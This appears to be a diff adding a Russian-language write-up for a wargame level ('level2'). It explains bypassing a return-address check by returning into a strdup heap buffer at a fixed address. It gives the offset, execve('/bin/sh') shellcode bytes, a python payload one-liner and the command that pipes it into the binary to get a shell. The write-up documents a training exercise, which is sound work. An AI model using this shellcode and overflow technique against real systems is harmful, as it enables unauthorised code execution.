@@ -1,0 +1,21 @@
+функция main зпускает фнукцию p в которой есть gets, но предпринята попытка его защитить:если адрес указанный в return pointer будет указывать на стэк (или любое другое адресное
+пространство начинающееся на b) то программа выйдет через exit не доходя до return pointer
+в тоже время введенная в gets строка в конце функции р аллоцируется через strdup на хипе
+адрес всегда один и тот же, 0x0804a008 (можно посмотреть через gdb или ltrace)
+мы можем указать return pointer этот адрес и записать в него шелкод
+https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
+offset = 80
+шелкод ниже является аналогом данной этой функции и может быть получен через disas /r
+ #include <stdio.h>
+       main() {
+       char *name[2];
+       name[0] = "sh";
+       name[1] = NULL;
+       execve("/bin/sh",name,NULL);
+          }
+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
+его длина 45 символов, следовательно надо будет добавить 35 символов для отступа, итак:
+python -c 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "A" * 35 + "\x08\xa0\x04\x08"' > /tmp/exploit2
+cat /tmp/exploit2 /dev/stdin | ./level2
+whoami
+level3
